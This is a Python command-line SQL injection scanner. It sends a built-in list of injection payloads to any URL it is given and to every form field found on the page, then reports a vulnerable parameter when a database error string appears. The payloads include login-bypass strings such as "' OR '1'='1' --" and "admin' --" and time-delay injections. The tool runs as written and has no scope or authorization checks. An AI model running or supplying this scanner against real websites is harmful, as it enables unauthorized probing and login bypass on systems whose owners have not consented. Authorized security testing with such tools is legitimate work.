import requests
import argparse
from urllib.parse import urlparse, urljoin
try:
    from bs4 import BeautifulSoup
    bs4_present = True
except ImportError:
    bs4_present = False

# Default SQLi payloads
default_sqli_payloads = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR '1'='1'{",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "1' WAITFOR DELAY '0:0:5'--",
    "1'; WAITFOR DELAY '0:0:5'--",
    # Add more payloads as needed
]

# Default error indicators
default_error_indicators = [
    "you have an error in your sql syntax",
    # Add more default error indicators as needed
]

def test_url(url, payloads, error_indicators, method='GET', data=None, timeout=10, verbosity=0):
    vulnerable = False
    for payload in payloads:
        if method == 'GET':
            test_url = f"{url}{payload}"
            try:
                response = requests.get(test_url, timeout=timeout)
            except requests.RequestException as e:
                if verbosity > 0:
                    print(f"Request failed: {e}")
                continue
        else:  # POST
            modified_data = {key: payload for key in data}
            try:
                response = requests.post(url, data=modified_data, timeout=timeout)
            except requests.RequestException as e:
                if verbosity > 0:
                    print(f"Request failed: {e}")
                continue

        if verbosity > 1:
            print(f"Testing with payload: {payload}")
        
        for indicator in error_indicators:
            if indicator in response.text.lower():
                print(f"[!] Vulnerable {method} parameter detected at: {url}")
                print(f"    Payload: {payload}")
                vulnerable = True
                break
        if vulnerable:
            break

def test_forms(url, payloads, error_indicators, timeout, verbosity):
    if not bs4_present:
        print("bs4 (BeautifulSoup) not installed. Skipping form tests.")
        return
    response = requests.get(url, timeout=timeout)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').upper()
        action_url = urljoin(url, action)
        inputs = form.find_all('input')
        form_data = {input.get('name'): "test" for input in inputs if input.get('type') != 'submit'}
        test_url(action_url, payloads, error_indicators, method=method, data=form_data, timeout=timeout, verbosity=verbosity)

def main():
    parser = argparse.ArgumentParser(description="Advanced SQL Injection Scanner")
    parser.add_argument("url", help="The URL to scan for SQL Injection vulnerabilities")
    parser.add_argument("--payloads", help="File containing custom SQLi payloads (one per line)", type=str)
    parser.add_argument("--timeout", help="Request timeout in seconds", type=int, default=10)
    parser.add_argument("--verbosity", help="Increase output verbosity (0 = minimal, 1 = detailed, 2 = debug)", type=int, choices=[0, 1, 2], default=0)
    args = parser.parse_args()

    # Load custom payloads if provided, else use default payloads
    if args.payloads:
        try:
            with open(args.payloads, 'r') as file:
                payloads = [line.strip() for line in file.readlines()]
        except IOError:
            print("Failed to read payloads file, using default payloads.")
            payloads = default_sqli_payloads
    else:
        payloads = default_sqli_payloads

    # Use default error indicators
    error_indicators = default_error_indicators

    print(f"Scanning {args.url} for SQL Injection vulnerabilities with verbosity level {args.verbosity}...")
    # Test the provided URL with query parameters
    test_url(args.url, payloads, error_indicators, timeout=args.timeout, verbosity=args.verbosity)
    
    # Test forms for POST-based SQLi
    test_forms(args.url, payloads, error_indicators, timeout=args.timeout, verbosity=args.verbosity)

if __name__ == "__main__":
    main()
